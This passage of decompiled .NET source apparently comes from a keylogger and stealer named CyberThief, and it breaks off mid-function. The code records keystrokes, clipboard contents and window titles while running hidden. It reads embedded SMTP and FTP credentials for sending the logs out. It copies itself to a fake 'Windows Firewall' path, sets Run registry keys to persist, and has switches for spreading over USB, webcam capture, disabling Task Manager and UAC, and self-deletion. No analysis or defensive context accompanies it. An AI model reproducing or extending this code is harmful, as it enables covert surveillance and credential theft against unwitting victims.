        else if (Key == Keys.D2)
          this.God += "2";
        else if (Key == Keys.D3)
          this.God += "3";
        else if (Key == Keys.D4)
          this.God += "4";
        else if (Key == Keys.D5)
          this.God += "5";
        else if (Key == Keys.D6)
          this.God += "6";
        else if (Key == Keys.D7)
          this.God += "7";
        else if (Key == Keys.D8)
          this.God += "8";
        else if (Key == Keys.D9)
          this.God += "9";
        else if (Key == Keys.D0)
          this.God += "0";
        else if (Key == Keys.A)
          this.God += "a";
        else if (Key == Keys.B)
          this.God += "b";
        else if (Key == Keys.C)
          this.God += "c";
        else if (Key == Keys.D)
          this.God += "d";
        else if (Key == Keys.E)
          this.God += "e";
        else if (Key == Keys.F)
          this.God += "f";
        else if (Key == Keys.G)
          this.God += "g";
        else if (Key == Keys.H)
          this.God += "h";
        else if (Key == Keys.I)
          this.God += "i";
        else if (Key == Keys.J)
          this.God += "j";
        else if (Key == Keys.K)
          this.God += "k";
        else if (Key == Keys.L)
          this.God += "l";
        else if (Key == Keys.M)
          this.God += "m";
        else if (Key == Keys.N)
          this.God += "n";
        else if (Key == Keys.O)
          this.God += "o";
        else if (Key == Keys.P)
          this.God += "p";
        else if (Key == Keys.Q)
          this.God += "q";
        else if (Key == Keys.R)
          this.God += "r";
        else if (Key == Keys.S)
          this.God += "s";
        else if (Key == Keys.T)
          this.God += "t";
        else if (Key == Keys.U)
          this.God += "u";
        else if (Key == Keys.V)
          this.God += "v";
        else if (Key == Keys.W)
          this.God += "w";
        else if (Key == Keys.X)
          this.God += "x";
        else if (Key == Keys.Y)
          this.God += "y";
        else if (Key == Keys.Z)
          this.God += "z";
        else if (Key == Keys.Oemcomma)
          this.God += ",";
        else if (Key == Keys.OemMinus)
          this.God += "-";
        else if (Key == Keys.OemQuotes)
          this.God += "'";
        else if (Key == Keys.OemOpenBrackets)
          this.God += "[";
        else if (Key == Keys.OemCloseBrackets)
          this.God += "]";
        else if (Key == Keys.OemQuestion)
          this.God += "/";
        else if (Key == Keys.OemPipe)
          this.God += "\\";
        else if (Key == Keys.OemSemicolon)
          this.God += ";";
        else if (Key == Keys.OemPeriod)
          this.God += ".";
        else if (Key == Keys.Oemtilde)
          this.God += "`";
        else if (Key == Keys.Space)
          this.God += " ";
        else if (Key == Keys.Return)
          this.God += "\r\n";
        else if (Key == Keys.F1)
          this.God += "[F1]";
        else if (Key == Keys.F2)
          this.God += "[F2]";
        else if (Key == Keys.F3)
          this.God += "[F3]";
        else if (Key == Keys.F4)
          this.God += "[F4]";
        else if (Key == Keys.F5)
          this.God += "[F5]";
        else if (Key == Keys.F6)
          this.God += "[F6]";
        else if (Key == Keys.F7)
          this.God += "[F7]";
        else if (Key == Keys.F8)
          this.God += "[F8]";
        else if (Key == Keys.F9)
          this.God += "[F9]";
        else if (Key == Keys.F10)
          this.God += "[F10]";
        else if (Key == Keys.F11)
          this.God += "[F11]";
        else if (Key == Keys.F12)
          this.God += "[F12]";
        else if (Key == Keys.Delete)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Back)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Down)
          this.God += "";
        else if (Key == Keys.Up)
          this.God += "";
        else if (Key == Keys.Left)
          this.God += "";
        else if (Key == Keys.Right)
          this.God += "";
        else if (Key == Keys.Tab)
          this.God += "[TAB]";
        else if (Key == Keys.End)
          this.God += "[END]";
        else if (Key == Keys.Escape)
          this.God += "[ESC]";
        else if (Key == Keys.Divide)
          this.God += "/";
        else if (Key == Keys.Decimal)
          this.God += ".";
        else if (Key == Keys.Subtract)
          this.God += "-";
        else if (Key == Keys.Add)
          this.God += "+";
        else if (Key == Keys.Multiply)
          this.God += "*";
        else if (Key == Keys.ControlKey)
          this.God += "[CTRL]";
        else if (Key == Keys.Alt)
          this.God += "[ALT]";
        else if (Key == Keys.Prior)
          this.God += "[Page Up]";
        else if (Key == Keys.Next)
          this.God += "[Page Down]";
        else if (Key == Keys.Home)
          this.God += "[Home]";
        else if (Key == Keys.Insert)
          this.God += "[Insert]";
        else if (Key == Keys.End)
          this.God += "[End]";
        else if (Key == Keys.Escape)
        {
          this.God += "[Esc]";
        }
        else
        {
          if (Key != Keys.Snapshot)
            return;
          this.God += "[Prt Screen]";
        }
      }
      else
      {
        if (!(MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock))
          return;
        if (Key == Keys.D1)
          this.God += "!";
        else if (Key == Keys.D2)
          this.God += "@";
        else if (Key == Keys.D3)
          this.God += "#";
        else if (Key == Keys.D4)
          this.God += "$";
        else if (Key == Keys.D5)
          this.God += "%";
        else if (Key == Keys.D6)
          this.God += "^";
        else if (Key == Keys.D7)
          this.God += "&";
        else if (Key == Keys.D8)
          this.God += "*";
        else if (Key == Keys.D9)
          this.God += "(";
        else if (Key == Keys.D0)
          this.God += ")";
        else if (Key == Keys.A)
          this.God += "A";
        else if (Key == Keys.B)
          this.God += "B";
        else if (Key == Keys.C)
          this.God += "C";
        else if (Key == Keys.D)
          this.God += "D";
        else if (Key == Keys.E)
          this.God += "E";
        else if (Key == Keys.F)
          this.God += "F";
        else if (Key == Keys.G)
          this.God += "G";
        else if (Key == Keys.H)
          this.God += "H";
        else if (Key == Keys.I)
          this.God += "I";
        else if (Key == Keys.J)
          this.God += "J";
        else if (Key == Keys.K)
          this.God += "K";
        else if (Key == Keys.L)
          this.God += "L";
        else if (Key == Keys.M)
          this.God += "M";
        else if (Key == Keys.N)
          this.God += "N";
        else if (Key == Keys.O)
          this.God += "O";
        else if (Key == Keys.P)
          this.God += "P";
        else if (Key == Keys.Q)
          this.God += "Q";
        else if (Key == Keys.R)
          this.God += "R";
        else if (Key == Keys.S)
          this.God += "S";
        else if (Key == Keys.T)
          this.God += "T";
        else if (Key == Keys.U)
          this.God += "U";
        else if (Key == Keys.V)
          this.God += "V";
        else if (Key == Keys.W)
          this.God += "W";
        else if (Key == Keys.X)
          this.God += "X";
        else if (Key == Keys.Y)
          this.God += "Y";
        else if (Key == Keys.Z)
          this.God += "Z";
        else if (Key == Keys.Oemcomma)
          this.God += "<";
        else if (Key == Keys.OemMinus)
          this.God += "_";
        else if (Key == Keys.OemOpenBrackets)
          this.God += "{";
        else if (Key == Keys.OemCloseBrackets)
          this.God += "}";
        else if (Key == Keys.OemQuestion)
          this.God += "?";
        else if (Key == Keys.OemPipe)
          this.God += "|";
        else if (Key == Keys.OemSemicolon)
          this.God += ":";
        else if (Key == Keys.OemPeriod)
          this.God += ">";
        else if (Key == Keys.Oemtilde)
          this.God += "~";
        else if (Key == Keys.Space)
          this.God += " ";
        else if (Key == Keys.Return)
          this.God += "\r\n";
        else if (Key == Keys.F1)
          this.God += "[F1]";
        else if (Key == Keys.F2)
          this.God += "[F2]";
        else if (Key == Keys.F3)
          this.God += "[F3]";
        else if (Key == Keys.F4)
          this.God += "[F4]";
        else if (Key == Keys.F5)
          this.God += "[F5]";
        else if (Key == Keys.F6)
          this.God += "[F6]";
        else if (Key == Keys.F7)
          this.God += "[F7]";
        else if (Key == Keys.F8)
          this.God += "[F8]";
        else if (Key == Keys.F9)
          this.God += "[F9]";
        else if (Key == Keys.F10)
          this.God += "[F10]";
        else if (Key == Keys.F11)
          this.God += "[F11]";
        else if (Key == Keys.F12)
          this.God += "[F12]";
        else if (Key == Keys.Delete)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Back)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Down)
          this.God += "";
        else if (Key == Keys.Up)
          this.God += "";
        else if (Key == Keys.Left)
          this.God += "";
        else if (Key == Keys.Right)
          this.God += "";
        else if (Key == Keys.Tab)
          this.God += "[TAB]";
        else if (Key == Keys.End)
          this.God += "[END]";
        else if (Key == Keys.Escape)
          this.God += "[ESC]";
        else if (Key == Keys.Divide)
          this.God += "/";
        else if (Key == Keys.Decimal)
          this.God += ".";
        else if (Key == Keys.Subtract)
          this.God += "-";
        else if (Key == Keys.Add)
          this.God += "+";
        else if (Key == Keys.Multiply)
          this.God += "*";
        else if (Key == Keys.OemQuotes)
          this.God += this.Quotes.Text;
        else if (Key == Keys.ControlKey)
          this.God += "[CTRL]";
        else if (Key == Keys.Alt)
          this.God += "[ALT]";
        else if (Key == Keys.Prior)
          this.God += "[Page Up]";
        else if (Key == Keys.Next)
          this.God += "[Page Down]";
        else if (Key == Keys.Home)
          this.God += "[Home]";
        else if (Key == Keys.Insert)
          this.God += "[Insert]";
        else if (Key == Keys.End)
          this.God += "[End]";
        else if (Key == Keys.Escape)
        {
          this.God += "[Esc]";
        }
        else
        {
          if (Key != Keys.Snapshot)
            return;
          this.God += "[Prt Screen]";
        }
      }
    }

    public void ClipBoardCheck()
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.CurrentClipBoard, MyProject.Computer.Clipboard.GetText(), false) == 0)
        return;
      this.God = this.God + "\r\n\r\n|-----Clipboard Copy (" + this.activewindow + ") -----|\r\n" + MyProject.Computer.Clipboard.GetText() + "\r\n\r\n|-----" + this.activewindow + "-----|\r\n";
      this.CurrentClipBoard = MyProject.Computer.Clipboard.GetText();
    }

    public void CurrentWindowCheck()
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.activewindow = this.GetActiveWindowTitle();
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.activewindow, "", false) == 0)
        return;
      this.God = this.God + "\r\n\r\n|-----" + this.activewindow + " (" + DateAndTime.Now.ToLongTimeString() + ") -----|\r\n";
    }

    public object RandomNumber()
    {
      object obj = (object) "1234567890WERTYUIOPASDFGHJKLZXCVBNM";
      object Left1 = (object) Strings.Len(RuntimeHelpers.GetObjectValue(obj));
      object Limit = (object) 9;
      VBMath.Randomize();
      object Left2 = (object) "";
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, Limit, (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object objectValue = RuntimeHelpers.GetObjectValue(Conversion.Int(Microsoft.VisualBasic.CompilerServices.Operators.AddObject(Microsoft.VisualBasic.CompilerServices.Operators.MultiplyObject(Left1, (object) VBMath.Rnd()), (object) 1)));
          Left2 = Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Left2, (object) CyberThief.Mid(Conversions.ToString(obj), Conversions.ToInteger(objectValue), 1));
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      return RuntimeHelpers.GetObjectValue(Left2);
    }

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      CyberThief.GetWindowText(CyberThief.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public string EncryptMe(string sData)
    {
      SHA1Managed shA1Managed = new SHA1Managed();
      string base64String = Convert.ToBase64String(Encoding.ASCII.GetBytes(sData));
      Convert.ToBase64String(shA1Managed.ComputeHash(Encoding.ASCII.GetBytes(sData)));
      return base64String;
    }

    public string DecryptMe(string sData) => Encoding.ASCII.GetString(Convert.FromBase64String(sData));

    private void Timer1_Tick(object sender, EventArgs e) => this.CurrentWindowCheck();

    private void Timer2_Tick(object sender, EventArgs e) => this.ClipBoardCheck();

    private void CyberThief_FormClosing(object sender, FormClosingEventArgs e) => this.Finalize();

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.Opacity = 0.0;
label_2:
        num3 = 3;
        this.Visible = false;
label_3:
        num3 = 4;
        this.ShowInTaskbar = false;
label_4:
        num3 = 5;
        this.CheckInstanceOfApp();
label_5:
        num3 = 6;
        this.CheckFakeNameApp();
label_6:
        num3 = 7;
        byte[] bytes = ResourceReader.ReadResource(Application.ExecutablePath);
label_7:
        num3 = 8;
        string sData = Encoding.Default.GetString(bytes);
label_8:
        num3 = 9;
        this.Settings = Strings.Split(this.DecryptMe(sData), "alfjklj543l5jkljreiht3i4564hjkl5eskl54jk5ljs4kl5j4ekl5jrklje5tye65r4564");
label_9:
        num3 = 10;
        this.Email = this.DecryptMe(this.Settings[1]);
label_10:
        num3 = 11;
        this.Password = this.DecryptMe(this.Settings[2]);
label_11:
        num3 = 12;
        this.EmailTo = this.DecryptMe(this.Settings[3]);
label_12:
        num3 = 13;
        this.SMTPServer = this.Settings[4];
label_13:
        num3 = 14;
        this.SMTPPort = this.Settings[5];
label_14:
        num3 = 15;
        this.LogInterval = this.Settings[6];
label_15:
        num3 = 16;
        this.TheGodPath = this.Settings[7];
label_16:
        num3 = 17;
        this.ErrorTitle = this.Settings[8];
label_17:
        num3 = 18;
        this.ErrorMessage = this.Settings[9];
label_18:
        num3 = 19;
        this.ErrorIcon = this.Settings[10];
label_19:
        num3 = 20;
        this.DoIError = this.Settings[11];
label_20:
        num3 = 21;
        this.RegistryLM = this.Settings[12];
label_21:
        num3 = 22;
        this.RegistryCU = this.Settings[13];
label_22:
        num3 = 23;
        this.ActiveXKey = this.Settings[14];
label_23:
        num3 = 24;
        this.HiddenFile = Conversions.ToBoolean(this.Settings[15]);
label_24:
        num3 = 25;
        this.Persist = Conversions.ToBoolean(this.Settings[16]);
label_25:
        num3 = 26;
        this.HiddenTask = Conversions.ToBoolean(this.Settings[17]);
label_26:
        num3 = 27;
        this.DisableTM = Conversions.ToBoolean(this.Settings[18]);
label_27:
        num3 = 28;
        this.DisableReg = Conversions.ToBoolean(this.Settings[19]);
label_28:
        num3 = 29;
        this.ClearSteam = Conversions.ToBoolean(this.Settings[20]);
label_29:
        num3 = 30;
        this.CryptFolder = Conversions.ToBoolean(this.Settings[21]);
label_30:
        num3 = 31;
        this.ClipboardLog = Conversions.ToBoolean(this.Settings[22]);
label_31:
        num3 = 32;
        this.HideFileExtension = Conversions.ToBoolean(this.Settings[23]);
label_32:
        num3 = 33;
        this.SendScreenshots = Conversions.ToBoolean(this.Settings[24]);
label_33:
        num3 = 34;
        this.DisableCMD = Conversions.ToBoolean(this.Settings[25]);
label_34:
        num3 = 35;
        this.CloseSteam = Conversions.ToBoolean(this.Settings[26]);
label_35:
        num3 = 36;
        this.MeltFile = Conversions.ToBoolean(this.Settings[27]);
label_36:
        num3 = 37;
        this.DisableUAC = Conversions.ToBoolean(this.Settings[28]);
label_37:
        num3 = 38;
        this.WebcamCapture = Conversions.ToBoolean(this.Settings[29]);
label_38:
        num3 = 39;
        this.IEClear = Conversions.ToBoolean(this.Settings[30]);
label_39:
        num3 = 40;
        this.FFClear = Conversions.ToBoolean(this.Settings[31]);
label_40:
        num3 = 41;
        this.WoWClear = Conversions.ToBoolean(this.Settings[32]);
label_41:
        num3 = 42;
        this.FTPName = this.DecryptMe(this.Settings[33]);
label_42:
        num3 = 43;
        this.FTPPass = this.DecryptMe(this.Settings[34]);
label_43:
        num3 = 44;
        this.FTPHost = this.DecryptMe(this.Settings[35]);
label_44:
        num3 = 45;
        this.UseFTP = Conversions.ToBoolean(this.Settings[36]);
label_45:
        num3 = 46;
        this.UseSMTP = Conversions.ToBoolean(this.Settings[37]);
label_46:
        num3 = 47;
        this.DoIKeylog = Conversions.ToBoolean(this.Settings[38]);
label_47:
        num3 = 48;
        this.DoISteal = Conversions.ToBoolean(this.Settings[39]);
label_48:
        num3 = 49;
        this.DoISpread = Conversions.ToBoolean(this.Settings[40]);
label_49:
        num3 = 50;
        this.WebsiteBlocker = Conversions.ToBoolean(this.Settings[41]);
label_50:
        num3 = 51;
        this.WebsiteURLs = this.Settings[42];
label_51:
        num3 = 52;
        this.AntiHeavenCheck = Conversions.ToBoolean(this.Settings[43]);
label_52:
        num3 = 53;
        this.SpecificKeylogging = Conversions.ToBoolean(this.Settings[44]);
label_53:
        num3 = 54;
        this.KeylogOnlyWindows = this.Settings[45];
label_54:
        num3 = 55;
        this.RemoteDownload = Conversions.ToBoolean(this.Settings[46]);
label_55:
        num3 = 56;
        this.DownloadURL = this.Settings[47];
label_56:
        num3 = 57;
        this.DownloadName = this.Settings[48];
label_57:
        num3 = 58;
        this.USBSpread = Conversions.ToBoolean(this.Settings[49]);
label_58:
        num3 = 59;
        this.RecordMouse = Conversions.ToBoolean(this.Settings[50]);
label_59:
        num3 = 60;
        this.LMouseToggle = Conversions.ToBoolean(this.Settings[51]);
label_60:
        num3 = 61;
        this.RMouseToggle = Conversions.ToBoolean(this.Settings[52]);
label_61:
        num3 = 62;
        this.MiddleMouseToggle = Conversions.ToBoolean(this.Settings[53]);
label_62:
        num3 = 63;
        this.LMouse = this.Settings[54];
label_63:
        num3 = 64;
        this.RMouse = this.Settings[55];
label_64:
        num3 = 65;
        this.MiddleMouse = this.Settings[56];
label_65:
        num3 = 66;
        this.DeleteDataDB = Conversions.ToBoolean(this.Settings[57]);
label_66:
        num3 = 67;
        this.MutexNumber = this.Settings[58];
label_67:
        num3 = 68;
        this.StealDataDB = this.Settings[59];
label_68:
        num3 = 69;
        this.DisableSystemRestore = Conversions.ToBoolean(this.Settings[60]);
label_69:
        num3 = 70;
        this.RemoteControl = Conversions.ToBoolean(this.Settings[61]);
label_70:
        num3 = 71;
        this.RemoteSite = this.Settings[62];
label_71:
        num3 = 72;
        this.BotKiller = Conversions.ToBoolean(this.Settings[63]);
label_72:
        num3 = 73;
        this.RegCU = Conversions.ToBoolean(this.Settings[64]);
label_73:
        num3 = 74;
        this.RegLM = Conversions.ToBoolean(this.Settings[65]);
label_74:
        num3 = 75;
        this.DoIActiveX = Conversions.ToBoolean(this.Settings[66]);
label_75:
        num3 = 76;
        this.DelayInfection = Conversions.ToBoolean(this.Settings[67]);
label_76:
        num3 = 77;
        this.DelayTime = Conversions.ToInteger(this.Settings[68]);
label_77:
        num3 = 78;
        this.DoIInstall = Conversions.ToBoolean(this.Settings[69]);
label_78:
        num3 = 79;
        this.DoIStartup = Conversions.ToBoolean(this.Settings[70]);
label_79:
        num3 = 80;
        this.FileName = this.Settings[71];
label_80:
        num3 = 81;
        this.WereDoICopy();
label_81:
        num3 = 82;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Firewall\\WIN32.exe", false) != 0)
          goto label_83;
label_82:
        num3 = 83;
        this.RunVirusOnStartup();
label_83:
        num3 = 85;
        this.IsItInfected();
label_84:
        num3 = 86;
        MyProject.Computer.Registry.CurrentUser.DeleteSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + this.ActiveXKey);
label_85:
        num3 = 87;
        this.activewindow = this.GetActiveWindowTitle();
label_86:
        num3 = 88;
        this.God = "|-----" + this.activewindow + " (" + DateAndTime.Now.ToLongTimeString() + ") -----|\r\n";
label_87:
        num3 = 89;
        this.Timer3.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.LogInterval) * 60000.0)));
label_88:
        num3 = 90;
        this.Timer3.Start();
label_89:
        num3 = 91;
        this.Timer1.Start();
label_90:
        num3 = 92;
        this.Timer4.Start();
label_91:
        num3 = 93;
        if (!this.HiddenFile)
          goto label_93;
label_92:
        num3 = 94;
        this.Timer5.Start();
label_93:
        num3 = 96;
        if (!(this.Persist & this.DoIStartup))
          goto label_95;
label_94:
        num3 = 97;
        this.Timer6.Start();
label_95:
        num3 = 99;
        if (!this.DisableCMD)
          goto label_97;
label_96:
        num3 = 100;
        this.Timer7.Start();
label_97:
        num3 = 102;
        if (!this.ClipboardLog)
          goto label_106;
label_98:
        num3 = 103;
        this.CurrentClipBoard = MyProject.Computer.Clipboard.GetText();
label_99:
        num3 = 104;
        this.CH.Install();
        goto label_106;
label_101:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 33:
                goto label_32;
              case 34:
                goto label_33;
              case 35:
                goto label_34;
              case 36:
                goto label_35;
              case 37:
                goto label_36;
              case 38:
                goto label_37;
              case 39:
                goto label_38;
              case 40:
                goto label_39;
              case 41:
                goto label_40;
              case 42:
                goto label_41;
              case 43:
                goto label_42;
              case 44:
                goto label_43;
              case 45:
                goto label_44;
              case 46:
                goto label_45;
              case 47:
                goto label_46;
              case 48:
                goto label_47;
              case 49:
                goto label_48;
              case 50:
                goto label_49;
              case 51:
                goto label_50;
              case 52:
                goto label_51;
              case 53:
                goto label_52;
              case 54:
                goto label_53;
              case 55:
                goto label_54;
              case 56:
                goto label_55;
              case 57:
                goto label_56;
              case 58:
                goto label_57;
              case 59:
                goto label_58;
              case 60:
                goto label_59;
              case 61:
                goto label_60;
              case 62:
                goto label_61;
              case 63:
                goto label_62;
              case 64:
                goto label_63;
              case 65:
                goto label_64;
              case 66:
                goto label_65;
              case 67:
                goto label_66;
              case 68:
                goto label_67;
              case 69:
                goto label_68;
              case 70:
                goto label_69;
              case 71:
                goto label_70;
              case 72:
                goto label_71;
              case 73:
                goto label_72;
              case 74:
                goto label_73;
              case 75:
                goto label_74;
              case 76:
                goto label_75;
              case 77:
                goto label_76;
              case 78:
                goto label_77;
              case 79:
                goto label_78;
              case 80:
                goto label_79;
              case 81:
                goto label_80;
              case 82:
                goto label_81;
              case 83:
                goto label_82;
              case 84:
              case 85:
                goto label_83;
              case 86:
                goto label_84;
              case 87:
                goto label_85;
              case 88:
                goto label_86;
              case 89:
                goto label_87;
              case 90:
                goto label_88;
              case 91:
                goto label_89;
              case 92:
                goto label_90;
              case 93:
                goto label_91;
              case 94:
                goto label_92;
              case 95:
              case 96:
                goto label_93;
              case 97:
                goto label_94;
              case 98:
              case 99:
                goto label_95;
              case 100:
                goto label_96;
              case 101:
              case 102:
                goto label_97;
              case 103:
                goto label_98;
              case 104:
                goto label_99;
              case 105:
              case 106:
                goto label_106;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_101;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_106:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void CH_Changed(Clipboard sender)
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.CurrentClipBoard, MyProject.Computer.Clipboard.GetText(), false) == 0)
        return;
      this.God = this.God + "\r\n\r\n|-----Clipboard Copy (" + this.activewindow + ") -----|\r\n" + MyProject.Computer.Clipboard.GetText() + "\r\n\r\n|-----" + this.activewindow + "-----|\r\n";
      this.CurrentClipBoard = MyProject.Computer.Clipboard.GetText();
    }

    public void RunVirusOnStartup()
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(this.CanISeeAnyFolder(), (object) false, false))
      {
        this.CreateDirectory();
        Microsoft.VisualBasic.FileSystem.FileCopy(Application.ExecutablePath, this.TheGodPath);
      }
      Process.Start(this.TheGodPath);
      // ISSUE: explicit finalizer call
      this.Finalize();
      ProjectData.EndApp();
    }

    public void HideFileExt()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string keyName = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
label_2:
        num3 = 3;
        MyProject.Computer.Registry.SetValue(keyName, nameof (HideFileExt), (object) "1", RegistryValueKind.DWord);
        goto label_9;
label_4:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_9;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void RegistryInformationCheck()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (!this.RegLM)
          goto label_5;
label_2:
        num3 = 3;
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
label_3:
        num3 = 4;
        registryKey1.SetValue(this.RegistryLM, (object) this.TheGodPath);
label_4:
        num3 = 5;
        registryKey1.Close();
label_5:
        num3 = 7;
        if (!this.RegCU)
          goto label_15;
label_6:
        num3 = 8;
        RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
label_7:
        num3 = 9;
        registryKey2.SetValue(this.RegistryCU, (object) this.TheGodPath);
label_8:
        num3 = 10;
        registryKey2.Close();
        goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
              case 12:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void MeltExecute() => MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\melt.txt")));

    public void MeltPrime()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Microsoft.VisualBasic.FileSystem.FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\{452252}-{521111}-{251111}.exe");
label_2:
        num3 = 3;
        FileStream fileStream = (FileStream) null;
label_3:
        num3 = 4;
        fileStream = System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\melt.txt");
label_4:
        num3 = 5;
        using (fileStream)
          ;
label_9:
        num3 = 7;
        StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\melt.txt");
label_10:
        num3 = 8;
        streamWriter.WriteLine(Application.ExecutablePath);
label_11:
        num3 = 9;
        streamWriter.Flush();
label_12:
        num3 = 10;
        streamWriter.Close();
        goto label_19;
label_14:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
              case 7:
                goto label_9;
              case 8:
                goto label_10;
              case 9:
                goto label_11;
              case 10:
                goto label_12;
              case 11:
                goto label_19;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_14;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_19:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void RegistryRespawner()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell"));
label_2:
        num3 = 3;
        if (!this.RegCU)
          goto label_8;
label_3:
        num3 = 4;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "RegRead", new object[1]
        {
          (object) ("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run\\" + this.RegistryCU)
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_4:
        num3 = 5;
        if (Information.Err().Number == 0)
          goto label_8;
label_5:
        num3 = 6;
